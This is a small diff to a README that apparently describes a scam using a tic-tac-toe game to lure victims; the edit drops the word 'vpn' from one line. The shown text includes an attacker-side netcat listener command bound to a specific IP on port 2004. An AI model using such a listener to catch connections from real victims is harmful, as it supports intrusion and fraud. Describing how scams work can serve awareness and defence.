@@ -10,7 +10,7 @@ Scam attack that uses Tic tac toe game to catch victims
 
 ### How the scam works
 
-- The hacker opens up a vpn port at `82.165.97.169` for the victim to connect via port 2004
+- The hacker opens up a port at `82.165.97.169` for the victim to connect via port 2004
 
 ```bash
    $ nc -lnvp 2004 -s 82.165.97.169
